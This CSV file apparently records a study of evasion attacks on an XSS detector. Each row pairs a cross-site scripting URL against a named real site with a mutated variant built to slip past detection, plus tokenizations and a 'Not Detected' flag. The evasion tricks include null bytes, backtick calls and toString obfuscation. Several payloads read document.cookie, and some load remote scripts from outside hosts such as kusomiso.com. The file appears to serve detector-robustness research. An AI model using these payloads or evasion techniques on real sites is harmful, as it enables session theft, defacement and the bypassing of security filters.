Initial Payload,Initial Payload Tokenized,Mutated Payload,Mutated Payload Tokenized,Not Detected
http://www.fantasyplanet.cz/frasko/index.asp?lang='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e<br>%3cmarquee%3ewhitehat%20forever%3c/marquee%3e,"[['http://u', '>', '<h0>', '</h0>', '<br>', '<br>', '<marquee>', '</marquee>']]",http://www.fantasyplanet.cz/frasko/index.asp?lang='%22%3ch1%00%3erubberduck%3c%00/h1%3cbr%00%3c%00br%3e<br%00>%3c%00marquee%3ewhitehat%20forever%3c%00/marquee%3e,"[['http://u', 'None', 'None', 'None', 'None', 'None']]",True
http://members.sina.com/cgi-bin/nz/edit.cgi?netid=&amp;pd1=&amp;login=&amp;passwd=&amp;pass2=&amp;lastname=%22%3e%27%3e%<br>3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%2<br>8%38%38%2c%38%33%2c%38%33%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;firstname=&amp;country=united%20states&amp;reg<br>place=united%20states&amp;email1=&amp;gender=female&amp;gender=male&amp;birthplace=0&amp;birthmonth=00&amp;birthday=00&amp;birth<br>year=1900&amp;state=0&amp;city=&amp;zip=&amp;education=0&amp;jobfunction=0&amp;income=0&amp;nz_usa=checkbox&amp;nz_sex=checkbox&amp;nz_j<br>oke=checkbox&amp;nz_finance=checkbox&amp;nz_mall=checkbox&amp;nz_beauty=checkbox&amp;write=%20submit%20&amp;reset=clear&amp;<br>isreserved=&amp;lmode=,"[['http://u', 'None', 'login=', 'None', 'None', 'None', '>', '>', '<script>', 'alert(', 'None', '0,0,0)', ')', '</script>', 'None', 'country=', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'state=', 'city=', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None']]",http://members.sina.com/cgi-bin/nz/edit.cgi?netid=&amp;pd1=&amp;login=&amp;passwd=&amp;pass2=&amp;lastname=%22%3e%27%3e%<br%00 3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%2<br%00 8%38%38%2c%38%33%2c%38%33%29%29%3c%2f%73%63%72%69%70%74%00%3e%0a&amp;firstname=&amp;country=united%20states&amp;reg<br%00 place=united%20states&amp;email1=&amp;gender=female&amp;gender=male&amp;birthplace=0&amp;birthmonth=00&amp;birthday=00&amp;birth<br%00 year=1900&amp;state=0&amp;city=&amp;zip=&amp;education=0&amp;jobfunction=0&amp;income=0&amp;nz_usa=checkbox&amp;nz_sex=checkbox&amp;nz_j<br%00 oke=checkbox&amp;nz_finance=checkbox&amp;nz_mall=checkbox&amp;nz_beauty=checkbox&amp;write=%20submit%20&amp;reset=clear&amp;<br%00 isreserved=&amp;lmode=,"[['http://u', 'None', 'login=', 'None', 'None', 'None', '>', '>', 'None', 'alert(', 'None', 'None', 'country=', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'year=', 'state=', 'city=', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None']]",False
http://www.myinfosecjob.com/?s=%22%3e%3cscript%3ealert%28%27zer0%20security%27%29%3c%2fscript%3e,"[['http://u', '>', '<script>', 'alert(', ')', '</script>']]",http://www.myinfosecjob.com/?s=%22%3cscript%3etop[8680439.toString(30)](1)%28%27zer0%20security%27%29%3c%2fscript%3e,"[['http://u', '<script>', 'None', 'None', ')', ')', '</script>']]",False
http://www.cypack.com/manage/show_whois.html?domain='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.<br>js%3e%3c/script%3e,"[['http://u', '>', '>', '<script/src=http://kusomiso.com/xss.js>', '</script>']]",http://www.cypack.com/manage/show_whois.html?domain=%3e%22%3cscript/src=http://kusomiso.com/xss.<br %00%00js%3c/script%3e,"[['http://u', '>', 'None']]",False
http://www.carrefour.com/cdc/search-engine/?search=%22%3e'%3e%3cscript%20src=http://vuln.xssed.net/t<br>hirdparty/scripts/python5.js%3e%3c/script%3e,"[['http://u', '>', '>', '<script src=http://vuln.xssed.net/thirdparty/scripts/python0.js>', '</script>']]",http://www.carrefour.com/cdc/search-engine/?search=%22%3c%00script%20src=http://vuln.xssed.net/t<br%00 hirdparty/scripts/python5.js%3c%00%00/script%3e,"[['http://u', 'None']]",True
http://members.parsdata.com/default.aspx?ctl=forgotpassword&amp;cul=%22%20onmouseover%3dprompt%28123%29%<br>20bad%3d%22&amp;dll=user,"[['http://u', 'None', 'onmouseover=', 'None', '0', ')', 'None', 'None']]",//members.parsdata.com/default.aspx?ctl=forgotpassword&amp;cul=%22%20onmouseover%3dprompt%28123%29%<br 20bad%3d%22&amp;dll=user,"[['http://u', 'None', 'onmouseover=', 'None', '0', ')', 'None', 'None', 'None']]",False
http://www.hau1.info/forum/redirector.php?url=%3cscript%3ealert(2)%3c/script%3e,"[['http://u', '<script>', 'alert(', '0', ')', '</script>']]",http://www.hau1.info/forum/redirector.php?url=%3c%00script%3ealert`2`%3c/script%00%3e,"[['http://u', 'None', 'None']]",True
https://iforgot.apple.com/cgi-bin/webobjects/dsiforgot.woa/wa/authenticate?authenticationkey=aaaaaaa<br>aaaaaaaaaaaaaaaaaaaa&amp;language='&quot;--&gt;&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,"[['http://u', 'language=', '>', '</style>', '</script>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",https://iforgot.apple.com/cgi-bin/webobjects/dsiforgot.woa/wa/authenticate?authenticationkey=aaaaaaa<br%00%00>aaaaaaaaaaaaaaaaaaaa&amp;language='&quot;--&lt;/style%00%00&lt;/script%00%00&lt;script%00%00&gt;alert`document.cookie`&lt;%00%00/script&gt;,"[['http://u', 'None', 'language=', 'None', 'None']]",True
http://www.foxbaltimore.com/cgi-bin/websrch.pl?keywords=&quot;&gt;&lt;/a&gt;&lt;img src=x onerror=&quot;alert(1)&quot;;&gt;,"[['http://u', '>', '</a>', 'None']]",http://www.foxbaltimore.com/cgi-bin/websrch.pl?keywords=&quot;&lt;/a%00&lt;%00img src=x onerror=&quot;alert(1)&quot;;&gt;,"[['http://u', 'None']]",True
http://www.mtv.ru/tag/aaaaaaaaaa&quot;&gt;&lt;body onload=alert('xss')&gt;,"[['http://u', 'alert(', ""'xss'"", ')', '>']]",http://www.mtv.ru/tag/aaaaaaaaaa&quot;&lt;%00body onload=alert('xss')&gt;,"[['http://u', 'alert(', ""'xss'"", ')', '>']]",False
http://1.tool.ms/login.cgi?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,"[['http://u', '>', '>', '<script/src=http://kusomiso.com/xss.js>', '</script>']]",http://1.tool.ms/login.cgi?id=%3e%22%3cscript/src=http://kusomiso.com/xss.js%3c%00%00/script%3e,"[['http://u', '>', 'None']]",False
http://bdopen.com/themes/defeng/login.asp?folder=2326&amp;backpage=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,"[['http://u', 'None', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://bdopen.com/themes/defeng/login.asp?folder=2326&amp;backpage=&quot;&lt;%00script&gt;alert`document.cookie`&lt;/scr<br ipt&lt;%00marquee&lt;h1&gt;by+narcoticxs&lt;%00/h1&lt;/marquee&gt;,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://gti-web.mcafee.com/api/index.php/api?dataset=topmalware&amp;page=1&amp;rows=10&amp;format=js&amp;callback=&lt;if<br>rame src='http://xssed.com',"[['http://u', 'page=', 'None', 'None', 'None', '<iframe', 'src=', 'http://xssed']]",http://gti-web.mcafee.com/api/index.php/api?dataset=topmalware&amp;page=1&amp;rows=10&amp;format=js&amp;callback=&lt;if<br rame src='http://xssed.com',"[['http://u', 'page=', 'None', 'None', 'None', 'None', 'src=', 'http://xssed']]",True
http://www.wwf.org.nz/index.cfm?uglobalsearch=&quot;&gt;&lt;script&gt;alert('xss')&lt;%2fscript&gt;&amp;x=0&amp;y=0,"[['http://u', '>', '<script>', 'alert(', ""'xss'"", ')', '</script>', 'x=', 'y=']]",http://www.wwf.org.nz/index.cfm?uglobalsearch=&quot;&lt;script%00&gt;alert`xss`&lt;%00%2fscript&gt;&amp;x=0&amp;y=0,"[['http://u', 'None', 'None', 'x=', 'y=']]",True
http://www.fling.com/quicksearch.php?prg=1&amp;id=&quot;&gt;&lt;script+src=http://starext.by.ru/lt.js&gt;,"[['http://u', 'id=', '>', '<script src=http://starext.by.ru/lt.js>']]",http://www.fling.com/quicksearch.php?prg=1&amp;id=&quot;&lt;%00%00script+src=http://starext.by.ru/lt.js&gt;,"[['http://u', 'id=', 'None']]",True
https://bankingportal.sparkasse-werra-meissner.de/banking/?konto=%22%3e%3ciframe%20src=http://www.go<br>ogle.de%3e,"[['http://u', '>', '<iframe src=http://www.google.de>']]",https://bankingportal.sparkasse-werra-meissner.de/banking/?konto=%22%3ciframe%20src=http://www.go<br%00 ogle.de%3e,"[['http://u', 'None']]",True
